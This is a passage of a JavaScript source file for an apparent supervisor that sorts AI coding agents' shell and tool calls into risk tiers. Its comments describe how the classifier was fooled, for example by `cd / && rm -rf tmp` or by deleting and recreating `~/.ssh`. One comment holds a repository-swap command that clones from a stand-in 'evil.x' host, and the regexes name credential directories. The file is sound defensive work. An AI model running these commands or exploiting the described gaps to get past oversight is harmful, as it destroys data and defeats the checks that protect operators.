     */
    const hit = DESTRUCTIVE.exec(seg);
    const rule = RM_CMD.test(seg) ? "rm 的目标不在可重建集合里"
      : SYS_REDIRECT.test(seg) ? "重定向覆盖系统路径"
        : FIND_DELETE.test(seg) ? "find -delete"
          : hit ? `破坏性动作 — 匹配到 ${JSON.stringify(hit[0].trim().slice(0, 40))}`
            : writesSystemPath(seg) ? "写入系统路径"
              : DEPLOY.test(seg) ? "部署动作" : "未能命名的破坏性判定 —— 这是缺陷，请报告";
    return { tier, rule, segment: seg.trim().slice(0, 160) };
  }
  return { tier, rule: "未能定位到具体片段 —— 这本身是缺陷，请报告", segment: null };
}

/* ------------------------------------------------------------------ *
 * EPHEMERAL TARGETS — the difference between hygiene and harm
 * ------------------------------------------------------------------ */

const RM_CMD = /^\s*(?:sudo\s+)?rm\s/i;

/* the tokens an `rm` would actually remove: everything after the verb that is
   not a flag. Quoted targets are unwrapped; anything we cannot read stays in. */
function rmTargets(seg) {
  const m = /^\s*(?:sudo\s+)?rm\s+([\s\S]*)$/i.exec(seg);
  if (!m) return [];
  const out = [];
  for (const raw of m[1].split(/\s+/)) {
    const t = raw.trim();
    if (!t) continue;
    if (t.startsWith("-")) continue;                       // flag
    if (t === "--") continue;
    out.push(t.replace(/^(['"])([\s\S]*)\1$/, "$2"));
  }
  return out;
}

/* directories whose entire purpose is to be regenerated */
const EPHEMERAL_DIR = new Set([
  "node_modules", "dist", "build", "out", "target", "coverage", "tmp", "temp",
  ".cache", ".next", ".nuxt", ".turbo", ".parcel-cache", ".vite", ".svelte-kit",
  "__pycache__", ".pytest_cache", ".mypy_cache", ".ruff_cache", ".tox",
  ".gradle", ".terraform", ".outsider", "dist-user", "dist-plugin",
]);
/* files that are build output by their extension */
const EPHEMERAL_FILE = /\.(?:zip|tgz|tar|tar\.gz|whl|log|tmp|pyc|o|class|map|lock~|bak)$/i;

/* absolute roots where nothing is ever "just a build artifact", whatever it is
   called. `/usr/lib/node_modules` is a global install, not a rebuildable dir. */
const SYSTEM_ROOT = /^\/(?:usr|etc|bin|sbin|boot|sys|lib|lib64|dev|proc|opt|System|Library|Applications|Windows|Program)(?:\/|$)/i;

/*
 * isEphemeralTarget — with the directory the command is standing in.
 *
 * THE SECOND FIELD REPORT FOUND THE REAL FAILURE OF THE FIRST FIX. After V76 the
 * stranger's 152 blocks fell to 88, and the 88 were the SAME hygiene as before,
 * in the shapes that actually occur:
 *
 *     cd /tmp && rm -rf slimtest && mkdir slimtest
 *     cd /root/work/v07 && rm -rf X/node_modules && zip …
 *
 * The whitelist had been written against the forms quoted in the bug report —
 * cleaned up by a display layer that truncated at 110 characters and by a human
 * tidying them for prose. Those forms use a literal `/tmp/…` prefix and a bare
 * `node_modules`. THE WILD FORM IS `cd X && rm -rf <relative>`, and it matched
 * neither.
 *
 * So: a validated fix can be validated against the wrong artefact. The report
 * was honest, the numbers were real, and the transcription still moved the
 * target. Nothing but re-running on the ORIGINAL log catches that — which is
 * exactly what the second round did.
 *
 * Two rules now, and both are about paths rather than prefixes:
 *   1. the `cd` in the same command chain decides what a relative target means
 *   2. ANY path segment naming a rebuildable directory makes the target
 *      rebuildable — `a/b/node_modules`, `outsider-downloads/__pycache__`
 */
/*
 * NEVER REBUILDABLE, WHATEVER THE COMMAND CLAIMS.
 *
 * `.git` earned its place here from `rm -rf .git && git clone https://evil.x .git`
 * — a clone IS a content-restoring rebuild, but from a DIFFERENT SOURCE, and no
 * static reading of one command can tell that URL from the real origin. The rest
 * are directories whose whole value is the bytes inside them; a rule that talks
 * about "rebuildable" has nothing true to say about any of them.
 */
const NEVER_EPHEMERAL = /(?:^|\/)\.(?:ssh|gnupg|aws|kube|docker|config|git|env|netrc|npmrc|pypirc)(?:\/|$)|(?:^|\/)(?:secrets?|credentials?|\.env(?:\.\w+)?)(?:\/|$)/i;

export function isEphemeralTarget(t, cwdHint = null) {
  const s = String(t ?? "").trim();
  if (!s) return false;
  if (NEVER_EPHEMERAL.test(s)) return false;
  /* never reason about these — a bare wildcard, a parent walk, or a root has no
     single target to be sure about */
  if (s === "/" || s === "." || s === ".." || s === "*" || s === "~") return false;
  if (s.includes("..")) return false;
  if (s.startsWith("~")) return false;
  if (/^\$\{?\w/.test(s)) return false;                    // an unexpanded variable
  /* a glob is fine ONLY when it cannot escape the directory it names, i.e. the
     wildcard is in the basename: `*.zip`, `build/*.log` */
  const star = s.indexOf("*");
  if (star >= 0 && s.slice(star).includes("/")) return false;

  const rel = s.replace(/\/+$/, "");
  /* resolve against the chain's own `cd`, so a relative target is judged as the
     path it actually names */
  const abs = rel.startsWith("/") ? rel
    : (cwdHint && cwdHint.startsWith("/")
      ? `${cwdHint === "/" ? "" : cwdHint.replace(/\/+$/, "")}/${rel}` : null);
  const judged = abs ?? rel;

  if (judged.startsWith("/") && SYSTEM_ROOT.test(judged)) return false;
  /* the system temp roots, and only WITH something under them: `rm -rf /tmp`
     itself is not hygiene, and neither is `cd / && rm -rf tmp` */
  if (/^\/(?:tmp|var\/tmp|private\/tmp)\/[^/]/.test(judged)) return true;
  if (/^\/(?:tmp|var\/tmp|private\/tmp)\/?$/.test(judged)) return false;

  const segs = judged.split("/").filter(Boolean);
  const base = segs[segs.length - 1] ?? "";
  /* ANY segment — a rebuildable directory is rebuildable wherever it sits, and
     everything beneath it goes with it */
  if (segs.some((x) => EPHEMERAL_DIR.has(x))) return true;
  if (EPHEMERAL_FILE.test(base)) return true;
  /* an absolute path we could not otherwise justify stays out */
  if (judged.startsWith("/")) return false;
  /* relative, no ephemeral segment, and no `cd` to resolve it: unknowable */
  return false;
}

const GIT_PUSH = /^\s*git\s+push\b(.*)$/i;
const PROTECTED_BRANCH = /\b(?:main|master|release|prod|production)\b/i;
const FORCED = /(?:^|\s)(?:--force\b|-f\b|--force-with-lease\b)/;

/* the risk tier of ONE segment, default-deny */
function riskOfSegment(seg, cwdHint = null) {
  const gp = seg.match(GIT_PUSH);
  if (gp) {
    const rest = gp[1] ?? "";
    const positional = rest.trim().split(/\s+/).filter((t) => t && !t.startsWith("-"));
    return (!positional.length || FORCED.test(rest) || PROTECTED_BRANCH.test(rest)) ? "deploy" : "build";
  }
  /* a redirect target is real no matter what the head command is */
  if (SYS_REDIRECT.test(seg)) return "destructive";
  /*
   * QUOTED PAYLOAD ⇒ data. Stripped FIRST, ahead of every pattern below,
   * because every one of them scans the whole segment.
   *
   * Found on a real transcript: a `node -e "…"` whose JavaScript happened to
   * contain the string `find … -exec sed -i …` (it was a test fixture) was
   * denied as destructive. `git commit -m "remove the rm -rf hack"` is the same
   * defect with a far likelier trigger, and `grep -rn 'DROP TABLE' src` is a
   * third. A supervisor that cannot tell a command from a string ABOUT a
   * command will stop people from discussing dangerous things.
   *
   * `bash -c` is NOT here — there the quoted argument IS shell, so it is
   * classified recursively. `psql -c` is not here either: the payload is SQL,
   * and a DROP TABLE inside it is real. `find` is not here: its `-exec` payload
   * is a real command, which is the whole point of the check below.
   */
  const shellC = seg.match(/^\s*(?:sudo\s+)?(?:ba|z|da|)sh\s+-c\s+(['"])([\s\S]*)\1/);
  if (shellC) return worst("unknown", riskOfSegment(shellC[2], cwdHint));
  if (DATA_PAYLOAD.test(seg)) seg = seg.replace(/(['"])(?:\\.|(?!\1)[\s\S])*\1/g, "''");

  /*
   * ── WHAT IS BEING DELETED, NOT THAT SOMETHING IS ──────────────────────────
   *
   * MEASURED ON A STRANGER'S 9-DAY, 3872-CALL SESSION: 152 hard blocks, all
   * `destructive`, and reviewed one by one they were ALL build hygiene —
   *
   *     rm -rf /tmp/slimtest && mkdir slimtest
   *     rm -f Outsider-…-v39-loss.zip && zip -q …
   *     rm -rf /tmp/vfy4 && unzip -q …
   *     rm -rf node_modules && npm ci
   *
   * — 17 pointless interruptions a day, on the one tier that DUPLICATES what the
   * host already asks about. My own session showed 2, so the rate looked fine;
   * it looked fine because my session happened not to package anything. This is
   * the operator's first objection, arriving as a number nine days wide:
   * "rm -f 有时候就是必要的指令，不能一刀切."
   *
   * `rm -rf` is consequential because of its TARGET. Removing a temp directory
   * the same command then recreates is not a destructive act in any sense the
   * operator cares about, and calling it one costs the whole product its
   * credibility on every other thing it says.
   *
   * Conservative by construction: EVERY target must be provably ephemeral, and
   * anything absolute (outside /tmp), any `~`, any `..`, any bare wildcard, and
   * any unparseable form falls through to the destructive tier below.
   */
  if (RM_CMD.test(seg)) {
    const targets = rmTargets(seg);
    if (targets.length && targets.every((t) => isEphemeralTarget(t, cwdHint))) return "build";
  }
  if (FIND_DELETE.test(seg)) return "destructive";
  const fe = seg.match(FIND_EXEC);
  if (fe) {
    const inner = fe[1].replace(/\{\}/g, "").trim();
    if (MUTATES.test(inner)) return "destructive";
    return worst("safe", riskOfSegment(inner, cwdHint));
  }
  /*
   * PROVEN READ ⇒ its arguments are DATA, not verbs. Found on the same real
   * transcript:
   *     head -14 ci/github/outsider-protected-deploy.yml   → judged "deploy"
   * because DEPLOY matched the FILENAME. Reading a file whose name contains
   * "deploy" is not deploying. The head-anchored proof has to be consulted
   * before the unanchored tier patterns, or every read of a file about a
   * dangerous thing reads as a dangerous thing. Placed after the find checks,
   * since `find` is itself a proven read whose `-exec` is not.
   */
  if (SAFE_READ.test(seg)) return "safe";

  if (DESTRUCTIVE.test(seg) || writesSystemPath(seg)) return "destructive";
  if (DEPLOY.test(seg) || DB_EXEC.test(seg)) return "deploy";
  if (BUILD_SAFE.test(seg)) return "build";
  return "unknown";                                  // cannot prove safe
}

function riskOf(cmd, isEdit, path) {
  /* Outsider never blocks its own removal — checked first, ahead of every tier */
  if (UNINSTALL_TARGET.test(cmd) || (isEdit && UNINSTALL_TARGET.test(path))) return "safe";
  if (isEdit && SENSITIVE_PATH.test(path)) return "destructive";
  if (!cmd) return isEdit ? "build" : "safe";        // pure tool call: Edit=reversible, Read/Grep=safe
  /* tested on the WHOLE string — segmenting on `|` would hide the pipe itself —
     but on the MASKED whole string, so an interpreter's quoted fixture cannot
     impersonate one. See maskDataPayloads. */
  const scan = maskDataPayloads(maskHeredocs(cmd));
  if (REMOTE_EXEC.test(scan) || OPAQUE_EXEC.test(scan)) return "destructive";
  /* a script handed to a shell on stdin is a script, and gets read like one —
     whether it arrives by heredoc or down a pipe. `cat <<EOF | bash` was caught
     and `echo … | bash` was not, purely because one started with `cat`. */
  for (const body of shellHeredocBodies(cmd)) {
    if (riskOf(body, false, "") === "destructive") return "destructive";
  }
  for (const body of pipedIntoShell(cmd)) {
    if (riskOf(body, false, "") === "destructive") return "destructive";
  }
  let tier = "safe";
  /*
   * THE `cd` IS NOT NOISE — it decides what every relative path after it means.
   * `cd /tmp && rm -rf slimtest` and `cd /root/src && rm -rf slimtest` are
   * different acts, and the whole chain is one command. Carried forward as a
   * hint, absolute only: a relative `cd` compounds in ways not worth guessing,
   * so it clears the hint rather than pretending to track it.
   */
  let cwdHint = null;
  /* the segments come from the MASKED text for the same reason: a heredoc body
     can contain `&&`, `;`, `rm -rf` and anything else, and none of it runs */
  const segs = segmentsOf(scan);
  for (let i = 0; i < segs.length; i++) {
    const seg = segs[i];
    const cd = /^\s*cd\s+(?:--\s+)?(['"]?)([^'"]+)\1\s*$/.exec(seg);
    if (cd) {
      const to = cd[2].trim();
      /* `cd /` must stay "/" — stripping its trailing slash left an EMPTY
         string, which is falsy, so the hint silently vanished and `cd / && rm
         -rf tmp` was judged as a bare relative `tmp` and waved through as a
         build directory. One character, and it was the only escape the boundary
         suite caught. */
      /*
       * `cd` COMPOSES. Three writings of the same directory were getting two
       * different verdicts because only one level was tracked:
       *     cd /tmp && mkdir -p zipcheck && cd zipcheck && rm -rf X    ← blocked
       *     cd /tmp && rm -rf X                                        ← allowed
       *     rm -rf /tmp/zipcheck/X                                     ← allowed
       * A relative `cd` on top of a known absolute one is still knowable.
       */
      if (to.includes("..") || to.startsWith("~")) { cwdHint = null; continue; }
      if (to.startsWith("/")) cwdHint = to === "/" ? "/" : to.replace(/\/+$/, "");
      else if (cwdHint) {
        const base = cwdHint === "/" ? "" : cwdHint.replace(/\/+$/, "");
        cwdHint = `${base}/${to.replace(/\/+$/, "")}`;
      } else cwdHint = null;
      continue;
    }
    if (GLUE.test(seg)) continue;                    // cd/export carry no risk of their own
    /*
     * THE COMMAND'S OWN PROOF THAT THE TARGET IS REBUILDABLE.
     *
     * The stranger's remaining blocks were mostly one shape:
     *     cd /root/work && rm -rf <clone-target> && git clone … <clone-target>
     *     rm -rf zipcheck && mkdir zipcheck
     * Not under /tmp, so no whitelist could know it was scratch — but the
     * command SAYS SO, two segments later, by rebuilding exactly what it just
     * removed. That evidence is in the same string; it needs no configuration
     * and no guess about the operator's directory layout.
     */
    if (RM_CMD.test(seg) && riskOfSegment(seg, cwdHint) === "destructive") {
      const targets = rmTargets(seg);
      const later = segs.slice(i + 1).join(" ");
      if (targets.length && targets.every((t) => rebuiltBy(t, later))) continue;
    }
    tier = worst(tier, riskOfSegment(seg, cwdHint));
    if (tier === "destructive") break;
  }
  return tier;
}

/*
 * Does a later part of the SAME command recreate this exact path? Only the
 * creators that make a directory or unpack into one count, and the target has to
 * match as a whole path component — `rm -rf a && mkdir ab` is not a rebuild.
 */
/*
 * ── `mkdir` IS NOT A REBUILD ────────────────────────────────────────────────
 *
 * The first version of this rule accepted any creator, and the adversarial pass
 * showed what that buys:
 *
 *     rm -rf ~/.ssh && mkdir ~/.ssh        → build
 *     rm -rf /etc   && mkdir /etc          → build
 *     rm -rf src    && mkdir src           → build
 *
 * `~/.ssh` was a hard block one round earlier; adding four words made it
 * ordinary. The idea came from the field report and I implemented it without
 * testing it adversarially — the responsibility for that is entirely mine, and
 * the lesson is that a RELAXATION needs an attack suite in the same commit as
 * the relaxation.
 *
 * The correct statement, in the reporter's own words:
 *
 *   > 一个目录可重建，当且仅当重建它的那一步会把内容也放回去。
 *
 * `mkdir` recreates an inode. It proves the path will exist again; it proves
 * nothing about the bytes. Only creators that CARRY CONTENT count — a clone, an
 * unpack, an install, a copy from somewhere else.
 */
const REBUILDERS = /\b(?:git\s+clone[^\n]*?|unzip[^\n]*?-d|tar[^\n]*?-C|cp\s+-[rR][^\n]*?|rsync[^\n]*?|mv[^\n]*?)\s+(\S+)/g;
function rebuiltBy(target, later) {
  const t = String(target).replace(/\/+$/, "");
  if (!t || t.includes("*") || t.includes("..")) return false;
  if (NEVER_EPHEMERAL.test(t)) return false;
  for (const m of String(later).matchAll(REBUILDERS)) {
    const made = m[1].replace(/^(['"])([\s\S]*)\1$/, "$2").replace(/\/+$/, "");
    if (made === t) return true;
  }
  /* `git clone <url> <dir>` puts the directory last, so also accept a bare
     occurrence of the target as a standalone argument to a creator */
  return new RegExp(`\\b(?:clone|unzip|tar|cp|rsync)\\b[^\n]*?(?:^|\\s)${
    t.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}(?:\\s|$)`, "m").test(String(later));
}

/*
 * SIG — the action's identity, which the action STRING is not.
 *
 * The display action for a native tool call is `${toolName}(${path})`. Two edits
 * to one file during a refactor produce the identical string; so do a Read at
 * offset 200 and a Read at offset 900; `TaskUpdate()` carries no argument at
 * all, so every one of them is identical to every other. The repeated-action
 * detector keyed on that string and therefore fired on 38.9% of the calls in a
 * real session — 154 of 180 warnings, almost all of them a refactor editing one
 * file, correctly, several times.
 *
 * An identifier that cannot distinguish two different actions must never be
 * used as evidence that two actions were the same. For a shell command the text
 * IS the identity. For a tool call the identity is the whole input.
 */
function sigOf(toolName, toolInput, cmd) {
  if (cmd) return `sh:${cmd.trim().replace(/\s+/g, " ").slice(0, 200)}`;
  let body = "";
  try {
    const keys = Object.keys(toolInput ?? {}).sort();
    /* JSON.stringify the VALUE, not String() it. `String([{a:1},{b:2}])` is
       "[object Object],[object Object]" for every array of objects alive, so two
       calls with completely different payloads hashed identically — the same
       "identifier that cannot tell two actions apart" defect this function was
       added to fix, one level down. Caught on real traffic: three commits of
       three different file sets read as the same action repeated three times. */
    body = JSON.stringify(keys.map((k) => {
      let v; try { v = JSON.stringify(toolInput[k]); } catch { v = String(toolInput[k]); }
      return [k, String(v ?? "").slice(0, 400)];
    }));
  } catch { body = String(toolInput); }
  let h = 5381;
  for (let i = 0; i < body.length; i++) h = (((h << 5) + h) ^ body.charCodeAt(i)) >>> 0;
  return `${toolName}:${h.toString(36)}`;
}

/*
 * WHICH TOOLS ACTUALLY RUN A SHELL.
 *
 * FOURTH SIGHTING OF ONE BUG, and this one reached a real user's log:
 *
 *     destructive   Workflow   (命令为空)
 *
 * The `Workflow` tool has no `command`; it has a `script` — JAVASCRIPT source
 * for an orchestrator. That source was being read as a shell command, so a
 * workflow whose text merely mentioned `rm -rf` was classified as a destructive
 * shell action. Same error as `find -exec`, as `riskOfSegment`, as the
 * whole-command pipe scan: DATA READ AS A VERB.
 *
 * The other three were fixed by masking quoted regions. This one cannot be —
 * the entire input is data. So the fix is at the source: a tool's payload is a
 * shell command only when the tool is a shell. Everything else is content, and
 * content is judged by what the tool DOES, not by what its text says.
 *
 * Unknown/empty tool names still fall through to the generic extraction, because
 * the third-party adapters rely on it and an unrecognised runner really might be
 * a shell.
 */
const SHELL_TOOLS = new Set(["bash", "shell", "sh", "run", "runcommand", "run_command",
  "terminal", "exec", "exec_command", "execute", "local_shell", "container.exec",
  "bashoutput", "killshell"]);
const NON_SHELL_PAYLOAD = new Set(["script", "code"]);

export function classifyToolCall(toolName = "", toolInput = {}) {
  const tn = String(toolName ?? "").toLowerCase();
  const shellish = !tn || SHELL_TOOLS.has(tn);
  const cmd = String(
    toolInput.command ?? toolInput.cmd
    /* only when the tool could plausibly be a shell — never for a named
       non-shell tool that happens to carry source */
    ?? (shellish ? (toolInput.script ?? toolInput.code) : undefined)
    ?? "");
  const path = String(toolInput.file_path ?? toolInput.path ?? toolInput.filename ?? toolInput.notebook_path ?? "");
  const isTest = TEST_CMD.test(cmd);
  const isEdit = EDIT_TOOLS.has(toolName) || /\b(sed\s+-i|tee\s|>>\s|\bcat\s*>)/.test(cmd);
  const isSubmit = SUBMIT_CMD.test(cmd);
  const risk = riskOf(cmd, isEdit, path);
  const irreversible = risk === "destructive" || risk === "deploy";
  /*
   * `action` IS A DISPLAY STRING. It has been truncated to 200 characters since
   * the beginning, which is right for printing and catastrophic for anything that
   * re-classifies it — and both measurement harnesses did exactly that.
   *
   * Measured: a 263-character command that classifies as `unknown` comes out
   * `destructive` when re-read from its own 200-char prefix, because the cut
   * lands mid-path and leaves a bare `rm -f ` with no target. An external
   * reviewer saw `rm -f /roo` in the interrupt list, reproduced the full command
   * in isolation, found it allowed, and could not explain the difference. There
   * was nothing to explain in the classifier: the harness was judging a
   * substring.
   *
   * So the full text rides along, and every consumer that DECIDES uses `cmd`
   * while every consumer that PRINTS may use `action`. A truncated command must
   * never reach a verdict.
   */
  const full = cmd || `${toolName}(${path})`;
  const action = full.slice(0, 200);
  /* the agent declaring its charter arrives as an ordinary Write, so the
     declaration comes in through the channel the hook already watches */
  const charterBody = /(^|[/\\])\.outsider[/\\]charter\.json$/.test(path)
    ? String(toolInput.content ?? toolInput.new_string ?? toolInput.text ?? "") || null
    : null;
  /*
   * HOW MUCH HEAVIER THIS EDIT LEAVES THE PART. The host hands us both sides of
   * an Edit, so the one moment this is knowable for free is right here, at parse
   * time — reconstructing it later would mean re-reading files that have since
   * changed. Recorded as a NUMBER, never the text: it rides in the trajectory,
   * and the trajectory is held in memory for every step of the run.
   *
   * 0.009ms per edit, measured. Only for edits that carry both sides; a Write
   * has no "before" and honestly reports none.
   */
  const cx = (isEdit && toolInput.old_string != null && toolInput.new_string != null)
    ? deltaOf(String(toolInput.old_string), String(toolInput.new_string))
    : null;
  return { action, sig: sigOf(toolName, toolInput, cmd), file: path || null,
    /* only when it actually differs, so ordinary steps carry nothing extra */
    ...(full.length > action.length ? { cmd: full.slice(0, 4000) } : {}),
    ...(charterBody ? { charterBody } : {}),
    ...(cx != null ? { cx } : {}),
    actionKind: cmd ? "shell" : "tool-call", isTest, isEdit, isSubmit, risk, irreversible, toolName };
}

/* ------------------------------------------------------------------ *
 * heuristic transcript reading (fallback + non-JSON lines)
 * ------------------------------------------------------------------ */

const tryJSON = (s) => { try { return JSON.parse(s); } catch { return null; } };

function extractText(o) {
  const bits = [];
  const walk = (v, depth = 0) => {
    if (depth > 6 || v == null) return;
    if (typeof v === "string") { bits.push(v); return; }
    if (Array.isArray(v)) { v.forEach((x) => walk(x, depth + 1)); return; }
    if (typeof v === "object") {
      for (const k of ["command", "cmd", "content", "text", "output", "stdout", "stderr", "description", "input"]) {
        if (v[k] != null) walk(v[k], depth + 1);
      }
    }
  };
  walk(o);
  return bits.join("\n");
}

/* one line → events, schema-robust, using the terminal parser */
export function eventsFromTranscriptLine(rawLine) {
  if (!rawLine || !String(rawLine).trim()) return [];
  let probe = rawLine;
  try { probe = extractText(JSON.parse(rawLine)) || rawLine; } catch { /* not JSON */ }
  const out = [];
  for (const seg of String(probe).split(/\r?\n/)) {
    const ev = parseLine(seg);
    if (ev) out.push(ev);
  }
  return out;
}

/* ------------------------------------------------------------------ *
 * structured parsers
 * ------------------------------------------------------------------ */

const blockText = (c) => (Array.isArray(c)
  ? c.map((b) => (typeof b === "string" ? b : (b?.text ?? b?.content ?? ""))).join("\n")
  : (c == null ? "" : String(c)));

/* real test exit from a result body: prefer a failing summary, else passing */
function testExitFromOutput(obs) {
  for (const seg of String(obs).split(/\r?\n/)) {
    const ev = parseLine(seg);
    if (ev && ev.isTest && ev.exit != null) return ev.exit;
  }
  return null;
}

/*
 * Claude Code: pair tool_use with tool_result by id across lines. Emits ONE
 * complete step per tool call, with the real classification and real exit.
 */
export function makeClaudeCodeParser() {
  const pending = new Map();
  return {
    feed(line) {
      const obj = typeof line === "string" ? tryJSON(line) : line;
      if (!obj || typeof obj !== "object") return eventsFromTranscriptLine(line);
      const content = obj.message?.content ?? obj.content;
      if (!Array.isArray(content)) return [];
      const out = [];
      for (const b of content) {
        if (b?.type === "tool_use") {
          /*
           * ── uid：宿主给的唯一事件身份 ────────────────────────────────────
           *
           * `sig` is a CONTENT signature — same action, same string — and it was
           * being used as a timeline anchor. Measured on a real log: 510 unique
           * signatures across 518 steps, and the collisions are precisely the
           * repeated commands, which is the case anchoring exists for. Anchoring
           * on it matches the FIRST occurrence, so work done BEFORE a correction
           * gets counted as compliance after it — a false `met`.
           *
           * The host already assigns every tool call a unique id. Carry it.
           * Signature answers "are these two actions the same"; uid answers
           * "which one, and when" — different questions, and only one of them
           * can anchor a point in time.
           */
          pending.set(b.id, { ...classifyToolCall(b.name ?? "", b.input ?? {}), uid: b.id });
        } else if (b?.type === "tool_result") {
          const call = pending.get(b.tool_use_id) ?? classifyToolCall("tool", {});
          pending.delete(b.tool_use_id);
          const obs = blockText(b.content);
          /* fail CLOSED: a test whose result we cannot read stays `null` (unknown),
             NOT 0 — an unknown test result must never count as a passing test */
          const exit = b.is_error ? 1 : (call.isTest ? testExitFromOutput(obs) : 0);
          out.push({ ...call, uid: call.uid ?? b.tool_use_id, exit,
            executed: true, evidenceSource: "host-transcript-paired",
            observation: keepObs(obs, call.isTest) });
        } else if (b?.type === "text" && typeof b.text === "string") {
          const claim = parseLine(b.text);        // completion claims only (INTENT-guarded)
          if (claim && claim.report) out.push(claim);
        }
      }
      return out;
    },
  };
}

/*
 * keepObs — retain enough of a step's output for the grounding layer to read the
 * real failure. For a TEST step the traceback/assertion prints at the TAIL
 * (pytest/jest/go put the failure summary last), so keep the tail; for anything
 * else the head is fine. LOCAL ONLY — telemetry ships structural features, never
 * this text.
 */
function keepObs(obs, isTest) {
  const s = String(obs ?? "");
  return isTest ? s.slice(-1200) : s.slice(0, 400);
}

/*
 * normUsage — the four numbers that decide what a turn cost, and nothing else.
 *
 * They are NOT interchangeable and must never be summed into one "tokens":
 * a cache READ is roughly a tenth of the price of the same tokens fresh, and
 * cache CREATION is a premium paid once. A supervisor that adds them together
 * reports a session dominated by the cheapest number it has — this transcript
 * reads 298M cached against 1.2M generated — and would call a well-cached run
 * the most wasteful one in the fleet.
 */
export function normUsage(u) {
  if (!u || typeof u !== "object") return null;
  const n = (x) => (Number.isFinite(Number(x)) ? Number(x) : 0);
  const t = { in: n(u.input_tokens), out: n(u.output_tokens),
    cacheRead: n(u.cache_read_input_tokens), cacheCreate: n(u.cache_creation_input_tokens) };
  return (t.in || t.out || t.cacheRead || t.cacheCreate) ? t : null;
}

/*
 * USAGE IS PER LOG, NOT PER STEP — and the first attempt got this wrong in a way
 * worth keeping written down.
 *
 * Attributing each turn's usage to the tool calls in that turn undercounted the
 * session by 54% (507k generated against a true 1,097k), because an assistant
 * turn that only THINKS or writes prose produces no step to hang the cost on —
 * and that is exactly where a drifting agent burns its budget. Cost per tool
 * call is not the quantity anyone asked about.
 *
 * One log is one agent, so per-file totals are both exact and already the
 * per-agent breakdown: no division, no dropped turns, nothing to reconcile.
 */
const USAGE_RE = /"usage":\s*\{/;
function usageFromLine(line, acc) {
  if (!USAGE_RE.test(line)) return;
  const obj = tryJSON(line);
  const u = normUsage(obj?.message?.usage);
  if (!u) return;
  acc.turns += 1;
  acc.usage.in += u.in; acc.usage.out += u.out;
  acc.usage.cacheRead += u.cacheRead; acc.usage.cacheCreate += u.cacheCreate;
}

export const emptyUsage = () => ({ in: 0, out: 0, cacheRead: 0, cacheCreate: 0 });

/* find the first present value for any of `keys`, searching shallow-first */
function deepFind(obj, keys, depth = 0) {
  if (obj == null || depth > 5) return null;
  if (Array.isArray(obj)) {
    for (const x of obj) { const r = deepFind(x, keys, depth + 1); if (r != null) return r; }
    return null;
  }
  if (typeof obj === "object") {
    for (const k of keys) {
      if (obj[k] != null && (typeof obj[k] === "string" || typeof obj[k] === "number")) return obj[k];
    }
    for (const v of Object.values(obj)) { const r = deepFind(v, keys, depth + 1); if (r != null) return r; }
    return null;
  }
  return null;
}

/*
 * CODEX — written against a measured spec of codex-cli 0.145.0, not against a
 * guess. The previous reader for this host was `makeGenericStructuredParser`,
 * which looks for a key named `command`/`cmd` anywhere in the object. Codex does
 * not have one: the command lives inside `payload.arguments`, which is a JSON
 * STRING, so a key-walk never reaches it. Every Codex step therefore came back
 * empty — the same blindness as the node:test dialect, applied to an entire
 * host, and just as silent.
 *
 * The shapes, verbatim from the spec:
 *
 *   shell call    {type:"response_item", payload:{type:"function_call",
 *                    name:"exec_command", arguments:"{\"cmd\":…}", call_id}}
 *   shell result  {type:"response_item", payload:{type:"function_call_output",
 *                    call_id, output:"…\nProcess exited with code 0\nOutput:\n…"}}
 *   patch call    {type:"response_item", payload:{type:"custom_tool_call",
 *                    name:"apply_patch", input:"…", call_id}}
 *   patch result  {type:"event_msg", payload:{type:"patch_apply_end", call_id,
 *                    success:true, changes:{"<path>":{type:"update",…}}}}
 *   assistant     {type:"response_item", payload:{type:"message", role:"assistant",
 *                    content:[{type:"output_text", text}]}}
 *
 * Three things this host does BETTER than Claude Code, and the parser uses them:
 *   - the exit code is a real number in the output text, so test results do not
 *     depend on recognising a runner's dialect
 *   - `patch_apply_end.changes` names the edited paths exactly
 *   - `patch_apply_end.success` is a boolean
 *
 * One trap the spec names explicitly: assistant text is recorded TWICE, once as
 * `response_item/message` and once as `event_msg/agent_message`. Counting both
 * doubles every completion claim, so only the response_item is read.
 */
const CODEX_EXIT = /^Process exited with code (-?\d+)$/m;

export function makeCodexParser() {
  const pending = new Map();
  return {
    feed(line) {
      const obj = typeof line === "string" ? tryJSON(line) : line;
      const p = obj?.payload;
      if (!p || typeof p !== "object") return [];
      const out = [];

      if (p.type === "function_call") {
        /* `arguments` is a JSON string — a SECOND parse, and if it fails we keep
           null rather than inventing a command */
        let args = {};
        try { args = JSON.parse(String(p.arguments ?? "{}")); } catch { args = {}; }
        const cmd = args.cmd ?? args.command ?? "";
        pending.set(p.call_id, classifyToolCall("Bash", { command: String(cmd) }));
      } else if (p.type === "custom_tool_call") {
        /* apply_patch: the edited paths arrive later on patch_apply_end, so the
           call is held open until then */
        pending.set(p.call_id, { ...classifyToolCall(String(p.name ?? "apply_patch"), {}), isEdit: true });
      } else if (p.type === "patch_apply_end") {
        const files = Object.keys(p.changes ?? {});
        const call = pending.get(p.call_id) ?? classifyToolCall("apply_patch", {});
        pending.delete(p.call_id);
        /* one step per edited file: the loop detector localises by file, and a
           single step naming three paths cannot be compared against a traceback */
        for (const f of files.length ? files : [null]) {
          out.push({ ...call, isEdit: true, file: f,
            action: f ? `apply_patch(${f})` : "apply_patch()",
            exit: p.success === false ? 1 : 0,
            observation: keepObs(`${p.stdout ?? ""}\n${p.stderr ?? ""}`, false) });
        }
      } else if (p.type === "function_call_output" || p.type === "custom_tool_call_output") {
        const call = pending.get(p.call_id);
        if (!call) return out;                       // result for a call outside the window
        pending.delete(p.call_id);
        const raw = String(p.output ?? "");
        const m = raw.match(CODEX_EXIT);
        /* a REAL exit code, not a dialect guess. Absent ⇒ null (fail closed). */
        const exit = m ? (Number(m[1]) === 0 ? 0 : 1) : null;
        /* the body after "Output:" is the part a traceback lives in; the header
           lines are Codex's own accounting */
        const body = raw.includes("\nOutput:\n") ? raw.slice(raw.indexOf("\nOutput:\n") + 9) : raw;
        out.push({ ...call, exit, observation: keepObs(body, call.isTest) });
      } else if (p.type === "message" && p.role === "assistant") {
        const text = Array.isArray(p.content)
          ? p.content.map((b) => b?.text ?? "").join("\n") : String(p.content ?? "");
        for (const seg of text.split(/\r?\n/)) {
          const claim = parseLine(seg);
          if (claim?.report) out.push(claim);
        }
      }
      /* event_msg/agent_message is deliberately ignored: it duplicates the
         assistant message above, and counting both doubles every claim */
      return out;
    },
  };
}

/*
 * CodeBuddy and anything else structured: light extraction (command + exit_code
 * from known field names), heuristic fallback when the shape is unfamiliar.
